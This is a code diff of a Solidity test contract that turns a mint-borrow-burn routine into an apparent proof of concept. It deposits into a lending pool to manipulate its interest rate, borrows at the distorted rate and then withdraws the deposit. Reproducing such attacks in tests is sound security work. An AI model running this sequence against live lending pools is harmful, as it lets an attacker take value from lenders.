@@ -27,14 +27,24 @@ interface IToken {
 
 contract MintLoanAndBorrowTest {
 	function callMintAndBorrowAndBurn(
-		address loanToken,
-		address iToken,
-		uint256 flashLoanAmount
+		address loanToken, /// Underlying Token.
+		address iToken, /// Lending Pool.
+		uint256 collateralTokenSent, /// Borrowing collateral.
+        uint256 withdrawAmount, /// Borrowing principal.
+        uint256 hackDepositAmount /// Amount of underlying token to deposit on lending pool.
 	) public {
 		IToken iTokenContract = IToken(iToken);
-        IERC20(iToken).approve(address(this), flashLoanAmount);
-		iTokenContract.mint(address(this), flashLoanAmount);
-        iTokenContract.borrow("0x0", flashLoanAmount, 86400, 1000, loanToken, address(this), address(this), "0x0");
-        iTokenContract.burn(address(this), flashLoanAmount);
+        
+        /// @dev Allow the lending pool, iToken to get a deposit from this contract as a lender.
+        IERC20(iToken).approve(iToken, hackDepositAmount);
+
+        /// @dev Make a deposit as a lender, in order to manipulate the interest rate of the lending pool.
+		iTokenContract.mint(address(this), hackDepositAmount);
+
+        /// @dev Borrow liquidity from the pool at an unfair rate.
+        iTokenContract.borrow("0x0", collateralTokenSent, 86400, withdrawAmount, loanToken, address(this), address(this), "0x0");
+
+        /// @dev Get back the amount deposited in the first place.
+        iTokenContract.burn(address(this), hackDepositAmount);
 	}
 }
